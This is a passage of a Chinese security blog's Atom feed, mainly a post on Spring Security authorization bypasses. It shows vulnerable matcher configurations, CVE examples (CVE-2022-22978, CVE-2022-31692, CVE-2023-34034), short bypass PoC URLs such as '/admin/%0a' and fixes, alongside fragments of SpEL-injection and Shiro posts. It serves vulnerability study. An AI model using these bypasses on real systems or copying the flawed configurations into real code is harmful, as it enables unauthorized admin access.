keyword">new</span> <span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">addUrlPatterns</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> registrationBean<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&quot;&gt;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&quot;&gt;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&quot;&gt;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Shiro Attack</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/</id>
    <published>2024-07-15T13:56:45.000Z</published>
    <updated>2024-07-15T14:11:11.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：<a href="https://natro92.fun/posts/4b382a45/">https://natro92.fun/posts/4b382a45/</a></p><span id="more"></span><hr><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>环境：jdk1.8 + tomcat 8.5.98 + shiro 1.2.4</p><p>这里直接用p神的项目了：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p>下载后直接用IDEA打开，配置一下tomcat环境</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715212213428.png" alt="image-20240715212213428"></p><p>运行配置</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715213701618.png" alt="image-20240715213701618"></p><blockquote><p>Tips：如果tomcat控制台出现乱码，请在设置-控制台中更改编码为UTF-8</p></blockquote><blockquote><p>Tips：只有下载了源码才能在全局搜索中搜到对应调用的方法：请在 设置-Maven-正在导入 内修改</p></blockquote><p>然后访问即可</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715214344403.png" alt="image-20240715214344403"></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://natro92.fun/posts/4b382a45/&quot;&gt;https://natro92.fun/posts/4b382a45/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>SpringSecurity权限绕过</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/15/SpringSecurity%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/15/SpringSecurity%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</id>
    <published>2024-07-15T10:19:13.000Z</published>
    <updated>2024-07-19T02:49:43.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>趁热打铁v2，虽然实际上是纯记录用的</p><p>参考：<a href="https://xz.aliyun.com/t/13235">https://xz.aliyun.com/t/13235</a></p><span id="more"></span><hr><h1 id="antMatchers-配置不当权限绕过"><a href="#antMatchers-配置不当权限绕过" class="headerlink" title="antMatchers 配置不当权限绕过"></a>antMatchers 配置不当权限绕过</h1><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> antMatchersConfig <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">InMemoryUserDetailsManager</span> <span class="token function">userDetailsService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UserDetails</span> user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token function">withDefaultPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">username</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryUserDetailsManager</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里使用了<code>antMatchers(&quot;/test&quot;).access(&quot;hasRole(&#39;ADMIN&#39;)&quot;)</code>，只有ADMIN才可以访问<code>test</code>,但是没有去按照正常的写法:  <code>/test/**</code> ，导致可以通过<code>/test/</code>，来绕过对<code>/test</code> 的校验</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">mvcMatchers</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/test/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="regexMatchers-配置不当权限绕过"><a href="#regexMatchers-配置不当权限绕过" class="headerlink" title="regexMatchers 配置不当权限绕过"></a>regexMatchers 配置不当权限绕过</h1><blockquote><p>使用正则表达式进行匹配</p></blockquote><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>      <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          http              <span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"anonymous"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/admin</code>正则没写完整</p><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin?</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>将正则写完整</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin.*?"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="useSuffixPatternMatch-低版本权限绕过"><a href="#useSuffixPatternMatch-低版本权限绕过" class="headerlink" title="useSuffixPatternMatch 低版本权限绕过"></a>useSuffixPatternMatch 低版本权限绕过</h1><p>Spring-webmvc版本在&lt;&#x3D;4.3.25的情况下<code>suffixPatternMatch</code>默认为<code>True</code></p><p>该方法为是否启用后辍匹配,如果启用,则映射到<code>/users</code>的方法也可以匹配到<code>/users.*</code></p><p>也就是说<code>/users</code> 和<code>/users.*</code>是相等的</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2><p>低版本（1.x）的springboot上能绕过</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin.123456789</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>版本更新</p><hr><h1 id="CVE-2022-22978-（regexMatchers）"><a href="#CVE-2022-22978-（regexMatchers）" class="headerlink" title="CVE-2022-22978 （regexMatchers）"></a>CVE-2022-22978 （regexMatchers）</h1><p>影响版本：</p><p>Spring Security 5.6.x &lt; 5.6.4<br>Spring Security 5.5.x &lt; 5.5.7<br>Spring Security 5.4.x &lt; 5.4.11</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin/.*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>controller配置：只能对<code>/admin/**</code>这种匹配所有路径的语法才能生效，如果写死了<code>/admin/api</code>，这样子是无法绕过的，因为就算绕过权限校验，但是程序无法匹配到路由</p><h2 id="poc-3"><a href="#poc-3" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http">/admin/%0a/admin/%0d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>更新版本</p><p>或者感觉可以写死路由路径</p><hr><h1 id="CVE-2022-31692-（forward-amp-include-转发）"><a href="#CVE-2022-31692-（forward-amp-include-转发）" class="headerlink" title="CVE-2022-31692 （forward&amp;include 转发）"></a>CVE-2022-31692 （forward&amp;include 转发）</h1><p>当使用Spring  Security的时候，一般会创建一个<code>SecurityFilterChain</code>来为特定的路由设置权限，路由A为匿名访问权限，路由B为高权限，如果在Controller中定义低权限A路由return的时候，使用了<code>forward</code>或<code>include</code>请求，将会导致将低权限的请求转发或包含到一个更高权限的安全端点，从而实现越权</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecdemo2<span class="token punctuation">.</span>demos</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> antMatchersConfig <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http                <span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/forward"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                .antMatchers("/**").permitAll();</span><span class="token comment">//                .antMatchers("/test/**").permitAll();</span>        <span class="token comment">// @formatter:on</span>        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @formatter:off</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">InMemoryUserDetailsManager</span> <span class="token function">userDetailsService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UserDetails</span> user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token function">withDefaultPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">username</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryUserDetailsManager</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @formatter:on</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecdemo2<span class="token punctuation">.</span>demos<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/forward"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//    @GetMapping("/forward")</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"include:/admin"</span><span class="token punctuation">;</span>        <span class="token comment">//return "forward:/admin";</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/api"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">adminapi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello adminapi"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test/api"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">testapi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello testapi"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//    @RequestMapping(value = &#123;"/**"&#125;, method = &#123;RequestMethod.GET&#125;)</span><span class="token comment">//    @ResponseBody</span><span class="token comment">//    public String guest() &#123;</span><span class="token comment">//        return "hello guest";</span><span class="token comment">//    &#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="CVE-2023-34034（WebFlux）"><a href="#CVE-2023-34034（WebFlux）" class="headerlink" title="CVE-2023-34034（WebFlux）"></a>CVE-2023-34034（WebFlux）</h2><p>在Spring Security中，<code>ServerHttpSecurity</code>和<code>HttpSecurity</code>分别用于配置WebFlux和Web MVC应用程序的安全性</p><p>影响版本：</p><ul><li>6.1.0 to 6.1.1</li><li>6.0.0 to 6.0.4</li><li>5.8.0 to 5.8.4</li><li>5.7.0 to 5.7.9</li><li>5.6.0 to 5.6.11</li></ul><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">authorizeExchange</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">pathMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">pathMatchers</span><span class="token punctuation">(</span><span class="token string">"admin/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token comment">// 没有以 / 为开始</span>                <span class="token punctuation">.</span><span class="token function">anyExchange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>controller：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;趁热打铁v2，虽然实际上是纯记录用的&lt;/p&gt;
